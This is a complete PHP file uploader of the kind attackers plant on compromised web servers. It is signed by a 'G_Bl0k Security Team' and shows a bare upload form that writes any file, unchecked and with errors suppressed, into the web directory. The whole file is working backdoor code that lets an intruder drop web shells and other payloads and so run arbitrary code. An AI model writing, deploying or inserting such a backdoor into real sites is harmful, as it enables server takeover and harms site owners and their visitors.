<?php 
if($_POST){
if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>Yatta !!</b> => ".$_FILES["f"]["name"];
}else{
echo"<b>Oh crap :(";
}
}
else{
	echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=up><br><br>We Are G_Bl0k Security Team";
}

?>